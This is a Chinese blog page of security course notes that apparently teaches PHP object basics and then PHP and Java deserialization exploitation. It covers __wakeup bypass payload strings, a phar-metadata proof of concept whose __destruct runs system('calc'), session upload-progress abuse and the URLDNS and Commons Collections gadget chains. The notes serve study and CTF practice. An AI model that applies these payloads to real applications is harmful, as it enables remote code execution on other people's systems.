+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">class normalUser extends user&#123;</span><br><span class="line">	public $score;</span><br><span class="line">	</span><br><span class="line">	public function play()&#123;</span><br><span class="line">		echo this-&gt;userType;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>类的属性修饰符</p>
+<p>public、private、protected</p>
+<p>修饰:</p>
+<p>静态属性 static</p>
+<p>​	1.不可修改</p>
+<p>​	2.类的静态方法，可直接调用 class::function();</p>
+<p>final属性 子类无法重写父类方法</p>
+<p>类的分类</p>
+<p>1.普通类 没有任何修饰</p>
+<p>2.抽象类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class user&#123;</span><br><span class="line">	public function login()&#123;&#125;</span><br><span class="line">	public function logout()&#123;&#125;</span><br><span class="line">	</span><br><span class="line">	abstract funcion play();</span><br><span class="line">&#125;</span><br><span class="line">类里面的方法 有些是有详细实现的 有些就只有方法名字，无具体实现</span><br><span class="line">抽象类 不能被new 也就是不能被直接实例化</span><br><span class="line">可以通过子类继承补全方法</span><br></pre></td></tr></table></figure>
+
+<p>3.接口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">interface service&#123;</span><br><span class="line">	public function start();</span><br><span class="line">	public function stop();</span><br><span class="line">&#125;</span><br><span class="line">不含任何逻辑代码 只声明方法</span><br><span class="line"></span><br><span class="line">class child extends father implements service[, xxx]&#123;</span><br><span class="line">	.....</span><br><span class="line">	</span><br><span class="line">	function start()&#123;</span><br><span class="line">		echo &quot;this is start&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	function stop()&#123;</span><br><span class="line">		echo &quot;this is stop&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">implements可以实现多个接口</span><br></pre></td></tr></table></figure>
+
+<p>4.trait</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">//用于普遍操作，比如 文件读取 删除 IO操作 或者其他可以抽象出来的共同操作</span><br><span class="line">trait trait_class&#123;</span><br><span class="line">	function add()&#123;</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br><span class="line">	function sub()&#123;</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">实现代码复用 可以认为是代码段，方便复制粘贴</span><br><span class="line">class xxx&#123;</span><br><span class="line">	use trait_class;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>5.匿名类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">class user&#123;</span><br><span class="line">	public $username;</span><br><span class="line">	public function play($t)&#123;</span><br><span class="line">		echo $t-&gt;username;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$v = new user();</span><br><span class="line">//一次性匿名类例子</span><br><span class="line">$v-&gt;play(new class&#123;</span><br><span class="line">	public $username=&quot;我是匿名类&quot;;</span><br><span class="line">&#125;);</span><br><span class="line">//核心思路 更类似于 伪协议的data伪协议</span><br></pre></td></tr></table></figure>
+
+
+
+<p>序列化与反序列化</p>
+<p>如果属性权限为private，那么序列化后，存储的属性名字为 %00 + 类名 + %00 + 属性名</p>
+<p>如果属性权限为protected，那么序列化后，存储的属性名字为 %00 + * + %00 + 属性名</p>
+<p>序列化是将一个对象变成一个可以传输的字符串 serialize(对象) 返回反序列化后字符串</p>
+<p>反序列化就是将一个可以传输的字符串变成一个可以调用的对象 unserialize(反序列化字符串) 返回对象</p>
+<p>接口没有实例化对象 因此不能直接序列化</p>
+<p>匿名类不能序列化</p>
+<p>trait无法实例化 因此也不能序列化 </p>
+<p>魔术方法</p>
+<p>1.魔术方法是一类类的方法</p>
+<p>2.会在序列化和反序列化及其他特殊情况下，自动执行</p>
+<p>分类</p>
+<p>1.__construct 在实例化一个对象(new)时，会被自动调用</p>
+<p>不允许重复声明</p>
+<p>可以作为非public权限属性的初始化</p>
+<p>2.__sleep 和 __wakeup方法</p>
+<p>序列化时自动调用__sleep方法</p>
+<p>3.__destruct 方法</p>
+<p>类对象将要销毁，也就是脚本执行完毕后执行清理工作时自动执行</p>
+<p>可以通过system(‘taskkill &#x2F;fi “imagename eq php.exe” &#x2F;f’);删除进程(php.exe&#x2F;php-cgi.exe)绕过__destruct</p>
+<p>4.__call 和 __callstatic</p>
+<p>对象执行类不存在的方法的时候，会自动调用__call方法</p>
+<p>直接执行类的不存在的静态方法时，会自动调用__callstatic方法</p>
+<p>5.get 和 set 和 isset unset魔术方法</p>
+<p>__get 对不可访问属性或不存在属性进行访问引用时自动调用</p>
+<p>__set 对不可访问属性或不存在属性进行写入引用时自动调用</p>
+<p>__isset 对不可访问属性或不存在属性进行isset()操作时自动调用</p>
+<p>__unset 对不可访问属性或不存在属性进行unset()时自动调用</p>
+<p>6.__tostring</p>
+<p>类的实例 和 字符串 进行拼接或者作为字符串引用(例如传入函数时被作为字符串)时，会自动调用__tostring方法</p>
+<p>7.__invoke</p>
+<p>当类的实例被作为函数名字执行的时候，会自动调用__invoke方法</p>
+<p>8.__set_state($an_array)</p>
+<p>文档中说 执行var_export()时自动调用</p>
+<p>9.__debugInfo</p>
+<p>执行var_dump()时自动调用</p>
+<p>10.__clone方法</p>
+<p>当使用clone关键字，clone一个对象的时候会自动调用</p>
+<p>php的反序列化漏洞</p>
+<p>1.有反序列化提交的入口</p>
+<p>2.被反序列化的类的魔术方法，有可能被利用</p>
+<p>绕过__wakeup方法</p>
+<p>条件:</p>
+<ol>
+<li>php5至php5.6.25 之间的版本可以绕过</li>
+<li>php7至php7.0.10 之间的版本可以绕过</li>
+</ol>
+<p>绕过方法:</p>
+<p>1.反序列化字符串中表示属性数量的值 大于 大括号内实际属性的数量时，wakeup方法会被绕过</p>
+<p>2.绕过 +号正则匹配</p>
+<p>参数有过滤，不让输入  O:数字   的形式 试图防止反序列化某个对象</p>
+<p>O:数字 改为  O:+数组  就可以绕过上面的O:数字过滤</p>
+<p>3.引用绕过相等</p>
+<p>使用&amp;符号表示两个变量指向相同的内存引用地址</p>
+<p>4.16进制绕过</p>
+<p>反序列化后的字符串，不能出现某个关键单词时，可以使用大S绕过<br>O:8:”backdoor”:1:{s:4:”name”;s:10:”phpinfo();”;}  —&gt;</p>
+<p>O:8:”backdoor”:1:{S:4:”n\97me”;s:10:”phpinfo();”;}</p>
+<p>5.exception绕过</p>
+<p>不影响析构方法执行</p>
+<p>6.php反序列化字符逃逸</p>
+<p>​	1.可以控制某个类中的属性值</p>
+<p>​	2.间接控制了某个类的反序列化字符串</p>
+<p>​	3.由于存在无脑过滤，字符增减，造成描述中字符串的长度和实际的不一样</p>
+<p>​	4.从而能够逃逸出若干个字符，实现字符可控，从而闭合前面的双引号</p>
+<p>​	5.实现反序列化字符串的完全可控</p>
+<p>#第九课</p>
+<p>phar反序列化</p>
+<p>The phar extension provides a way to put entire PHP applications into a single file called a “phar” (PHP Archive) for easy distribution and installation</p>
+<p>Phar 认为是java的jar包 &#x2F; exe</p>
+<p>phar能干什么:</p>
+<p>1.多个php合并为独立压缩包 不解压就能执行里面的php文件</p>
+<p>2.支持web服务器和命令行</p>
+<p>phar协议:</p>
+<p>phar:&#x2F;&#x2F;xxx.phar&#x2F;aaa.php</p>
+<p>$phar-&gt;setmetadata($h);</p>
+<p>metaData可以存放一个类实例，生成phar后，会将这个类实例以序列化字符串形式存放在phar文件内，当使用phar协议加载phar文件时，会自动反序列化这个类的序列化字符串</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">*php.ini</span><br><span class="line">phar.readonly = Off</span><br><span class="line"></span><br><span class="line">*index.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class hack&#123;</span><br><span class="line">	public function __destruct()&#123;</span><br><span class="line">		system(&quot;calc&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$h = new hack();</span><br><span class="line"></span><br><span class="line">$phar = new phar(&quot;ctfshsow.phar&quot;);</span><br><span class="line"></span><br><span class="line">$phar-&gt;buildFromDirectory(your_project_path);</span><br><span class="line"></span><br><span class="line">$phar-&gt;setmetadata($h);</span><br><span class="line"></span><br><span class="line">$phar-&gt;setStub($phar-&gt;createDefaultStub(&#x27;from.php&#x27;, &#x27;index.php&#x27;));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*use.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">//需要注册恶意类才会加载</span><br><span class="line">class hack&#123;</span><br><span class="line">	public function __destruct()&#123;</span><br><span class="line">		system(&quot;calc&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">include &quot;phar://ctfshow.phar&quot;;</span><br><span class="line"></span><br><span class="line">file_exists(&quot;phar://ctfshow.phar&quot;);</span><br><span class="line"></span><br><span class="line">file_get_contents(&quot;phar://ctfshow.phar&quot;);</span><br><span class="line"></span><br><span class="line">file_put_contents(&quot;phar://ctfshow.phar&quot;, &quot;111&quot;);</span><br><span class="line"></span><br><span class="line">require &quot;phar://ctfshow.phar&quot;;</span><br><span class="line"></span><br><span class="line">fileinode(&quot;phar://ctfshow.phar&quot;);</span><br><span class="line"></span><br><span class="line">filemtime(&quot;phar://ctfshow.phar&quot;);</span><br><span class="line"></span><br><span class="line">filesize(&quot;phar://ctfshow.phar&quot;);</span><br><span class="line"></span><br><span class="line">is_dir(&quot;phar://ctfshow.phar&quot;);</span><br><span class="line"></span><br><span class="line">scandir(&quot;phar://ctfshow.phar&quot;);</span><br><span class="line"></span><br><span class="line">highlight_file(&quot;phar://ctfshow.phar&quot;);</span><br><span class="line"></span><br><span class="line">// 参数有 stirng $filename的函数都可以利用</span><br><span class="line"></span><br><span class="line">echo $flag; //$flag来源于 your_project_path/from.php</span><br></pre></td></tr></table></figure>
+
+<p>总结:</p>
+<ol>
+<li>生成phar包时，可以往metadata里面放对象</li>
+<li>生成后，对象会自动序列化保存到phar包中</li>
+<li>使用phar协议读取phar包时，如果当前脚本识别了这个类，则会自动调用这个类的魔术方法</li>
+</ol>
+<p>哪里使用的多</p>
+<p>如果有上传点，上传文件的前半部分可控，后缀黑名单，不能是危险的后缀(eg:php phps phtml ini) 没有禁止上传phar文件</p>
+<p>能够上传phar文件，找到大量使用file_exists等文件读取函数，通过控制phar:&#x2F;&#x2F;头，来使用phar协议来解析phar包</p>
+<p>就能自动进行反序列化</p>
+<p>条件:</p>
+<ol>
+<li>能够生成phar包并上传写入</li>
+<li>有可利用的文件操作函数，并控制了协议头，使用phar协议解析</li>
+<li>有可以利用的恶意类</li>
+</ol>
+<p>session反序列化</p>
+<p>PHP_SESSION_UPLOAD_PROGRESS</p>
+<p>php的session是存放在文件中的 默认位置是&#x2F;tmp&#x2F;sess_PHPSESSID</p>
+<p>session中是可以存放字符串、数字，也可以存放对象</p>
+<p>session中php处理器格式: key|serialize_string （u|O:4:”user”:2:{s:8:”username”;N;s:8:”password”;N;}）</p>
+<p>​         php_serialize处理器格式a:1:{s:1:key;serialize_string} (a:1:{s:1:”u”;O:4:”user”:2:{s:8:”username”;N;s:8:”password”;N;}})</p>
+<p>1.session里面存放对象时，会自动进行序列化，存放序列化后的字符</p>
+<p>2.session里面拿取对象时，会自动进行反序列化，执行对象的魔法方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">s = requests.session()</span><br><span class="line">file = &#123;</span><br><span class="line">	&quot;file&quot;: (payload, &quot;aaa&quot;)</span><br><span class="line">&#125;</span><br><span class="line">data = &#123;</span><br><span class="line">	&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;: 123</span><br><span class="line">&#125;</span><br><span class="line">cookie = &#123;</span><br><span class="line">	&quot;PHPSESSID&quot;: your_session_id</span><br><span class="line">&#125;</span><br><span class="line">response = s.post(url = url, data = data, files = file, cookies = cookie[, proxies = &#123;&quot;http&quot;: &quot;127.0.0.1:proxies_port&quot;&#125;])</span><br></pre></td></tr></table></figure>
+
+<p>thinkphp的反序列化</p>
+<p>php的开发框架</p>
+<p>一句话总结: 框架是为开发服务，不是面向产品</p>
+<p>php框架的设计思路:</p>
+<p>MVC结构的设计框架</p>
+<p>（python java 都有基于MVC设计思路提供的框架）</p>
+<p>MVC设计思路-&gt;基于MVC的框架-&gt;基于框架的产品</p>
+<p>M: model 模型: 只负责处理数据交互 数据输入，经过处理，返回处理后的数据，不在乎 数据哪里来的，也不在乎数据去哪里</p>
+<p>V: view 视图: 负责向控制器发送数据，经过控制器派发处理后，将数据回显在页面中</p>
+<p>C: controller 控制器:  只负责分发请求</p>
+<p>example:</p>
+<p>菜鸟包裹  -&gt;  前台负责分发任务</p>
+<p>​								快递员只负责接受，发送包裹，其他一律不管，可以认为他就是view 显示层</p>
+<p>​								包裹前台 认为是控制器，负责派件和收件的人员安排</p>
+<p>​								包裹就是model</p>
+<p>每个层都独立了，解耦</p>
+<p>MVC在web中的应用:</p>
+<p>1.所有的请求都统一入口  index.php</p>
+<p>2.通过不同的参数，表达不同的需求，由index.php作为控制器，统一分发处理</p>
+<p>3.分发给Model处理完毕后，结果返回给Index控制器</p>
+<p>4.Index控制器得到结果，返回给页面</p>
+<p>特点:</p>
+<p>1.从基于文件的url 转为 基于路由的url  从关注访问哪个文件 转向 关注url中的参数</p>
+<p>2.使用统一的view视图，返回的数据就是要显示的数据</p>
+<p>3.控制器和视图与用户有关联，模型相对于用户透明</p>
+<p>第10课 01:01:11</p>
+<p>pop链</p>
+<p>#第15课</p>
+<p>java基础</p>
+<p>java是一门编程语言</p>
+<p>纯粹的面向对象</p>
+<p>基于类和类的方法</p>
+<p>所有的类都存放在包 package中</p>
+<p>java的web基于servlet (基于路由)</p>
+<p>java的反序列化:</p>
+<p>序列化 类实例-&gt;字节流</p>
+<p>反序列化 字节流-&gt;类实例</p>
+<p>序列化  会自动调用writeObject方法</p>
+<p>反序列化  会自动调用readObject方法</p>
+<p>类要能序列化需要满足的条件:</p>
+<ol>
+<li>实现java.io.Serializable接口</li>
+<li>该类的所有属性必须都是可序列化的，如果有一个属性是不可序列化的，那么这个属性必须注明是短暂的</li>
+</ol>
+<p>反序列化漏洞利用条件:</p>
+<ol>
+<li>有反序列化接口，能够提交序列化的数据，会自动调用对应类的readObject方法</li>
+<li>有可以利用的类 readObject&#x2F;readUnshared通过跳板，最终可以实现写入或者执行</li>
+</ol>
+<p>当不允许反序列化漏洞的类，可以反序列化子类，也可以反序列化父类</p>
+<p>java反序列化总结:</p>
+<ol>
+<li>需要有一个提交反序列化字节流的地方</li>
+<li>有可以被利用的类，存在readObject方法</li>
+<li>类反序列化后，类实例已不再关注，我们重点是执行了readObject方法</li>
+</ol>
+<p>URLDNS链</p>
+<p>一句话总结: 不需要其他依赖，原生java库，支持反序列化后触发一次dns请求</p>
+<p>HashMap</p>
+<p>存放键值对的集合</p>
+<p>为了验证键有没有重复，会对键进行取哈希值操作</p>
+<p>hashCode 相同，就认为集合里面有这个键了，为了避免一个键对应多个值，所以会覆盖</p>
+<p>URLDNS链:</p>
+<p>利用两个类: HashMap 和 URL 类</p>
+<p>HashMap存在readObject方法，里面调用了hash方法，处理自己的key</p>
+<p>hash方法，调用了key的hashCode方法</p>
+<p>当我们传入的key是URL对象的时候，就会调用URL对象的的hashCode方法</p>
+<p>URL类的hashCode方法，只要自己的hashCode不是-1，就会调用自己handler属性的hashCode方法</p>
+<p>handler是URLStreamHandler类，他的hashCode方法</p>
+<p>调用了getHostAddress方法</p>
+<p>调用了URL类的getHostAddress方法</p>
+<p>最终调用了 InetAddress.getByName(host);实现了一次DNS请求</p>
+<p>利用点:</p>
+<ol>
+<li>验证反序列化漏洞存在，适合poc用</li>
+<li>判断对方服务器是否出网</li>
+</ol>
+<p>#第16课</p>
+<p>CC链 (就是有反序列化入口，同时有cc库的情况下，如果进行rce或者文件读取)</p>
+<p>CC库: Commons Collections apache组织发布的开源库</p>
+<p>里面主要是对集合的增强以及扩展类，被广泛使用</p>
+<p>HashMap HashTable ArrayList 都是集合</p>
+<p>CC链学习前置知识</p>
+<p>Transformer</p>
+<p>特征:</p>
+<ol>
+<li>是一个接口</li>
+<li>有一个transformer方法，传入一个参数object，传出一个参数object</li>
+<li>有点像 转接头 扩展坞</li>
+</ol>
+<p>实现类:</p>
+<p>ConstantTransformer 常量转换器: 传入任何值，传出的都是固定值</p>
+<p>InvokerTransformer 反射调用转换器: 传入方法名，方法参数类型，方法参数，进行反射调用</p>
+<p>ChainedTransformer 链式转换器: 分别调用传入的transformer类数组的transformer方法</p>
+<p>新的数据结构</p>
+<p>TransformerMap  分别可以对 key 和 value 执行构造参数里面的transformer转换</p>
+<p>更新 ing……</p>
+</div><link rel="stylesheet" href="/css/partial/footer.css"><div class="footer"><p><span>Copyright © 2017 - 2023</span><a target="_blank" rel="noopener" href="http://www.beian.miit.gov.cn/">蜀ICP备19024124号</a></p><p><i class="iconfont iconchakan"><span>本站总访问量</span><span id="busuanzi_container_site_pv">  <span id="busuanzi_value_site_pv"></span> </span></i><i class="iconfont iconabout"><span>本站访客数</span><span id="busuanzi_container_site_uv">  <span id="busuanzi_value_site_uv"></span> </span></i></p></div></div></div></div><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></body></html>
